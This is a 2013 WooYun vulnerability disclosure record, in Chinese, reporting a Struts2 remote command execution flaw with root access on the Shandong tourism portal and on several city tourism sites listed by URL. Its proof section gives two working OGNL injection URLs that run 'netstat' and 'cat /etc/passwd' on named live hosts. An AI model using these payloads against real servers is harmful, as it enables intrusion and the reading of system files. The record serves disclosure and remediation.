{"id": 9699, "wybug_id": "wooyun-2013-032592", "wybug_title": "山东旅游资讯网及省内各市级旅游资讯网 ST2执行漏洞", "wybug_corp": "山东省旅游局", "wybug_author": "xSky", "wybug_date": "2013-07-31 10:23", "wybug_open_date": "2013-09-14 10:24", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-14：\t细节向公众公开  简要描述： 山东旅游资讯网与各市级旅游资讯网站都是同套代码，都有ST2执行漏洞 详细说明：  山东旅游资讯网(http://www.sdta.cn/) 测试发现有ST2的执行漏洞，root权限。猜测可能还有别的站用的同类框架，于是看了下首页的友情链接，果然省内其它城市旅游资讯网都是同一框架。<a href=\"http://www.jnta.cn\" target=\"_blank\">济南</a><a href=\"http://www.qdta.cn/\" target=\"_blank\">青岛</a><a href=\"http://www.zbta.cn\" target=\"_blank\">淄博</a><a href=\"http://www.zzta.cn\" target=\"_blank\">枣庄</a><a href=\"http://www.dyta.cn\" target=\"_blank\">东营</a><a href=\"http://www.ytta.cn/\" target=\"_blank\">烟台</a><a href=\"http://www.wfta.cn\" target=\"_blank\">潍坊</a><a href=\"http://www.jita.cn\" target=\"_blank\">济宁</a><a href=\"http://www.whto.cn\" target=\"_blank\">威海</a><a href=\"http://www.rzta.com/\" target=\"_blank\">日照</a><a href=\"http://www.lwta.cn\" target=\"_blank\">莱芜</a><a href=\"http://www.lyta.cn\" target=\"_blank\">临沂</a><a href=\"http://www.dzta.cn\" target=\"_blank\">德州</a><a href=\"http://www.lcta.cn\" target=\"_blank\">聊城</a><a href=\"http://www.bzta.cn\" target=\"_blank\">滨州</a><a href=\"http://www.hzta.cn\" target=\"_blank\">菏泽</a>从页首源码里整个出来以上网站，基本都是同一框架，都能得到ROOT权限。测试过几个都是没打补丁。   漏洞证明：  山东旅游资讯网的漏洞：http://www.sdta.cn/dtss/detail/infoTypeDetail.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'netstat','-aopn'})).start(),%23b%3d%20%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}\n\n济南旅游资讯网：http://www.jnta.cn/dtssjinan/detail/activityDetail.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get%20('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}\n\n别的站就不一一证明了。   修复方案：  ST2执行漏洞，更新厂商发布的新版本程序。见 http://struts.apache.org/   版权声明：转载请注明来源 xSky@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-08-04 22:04 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}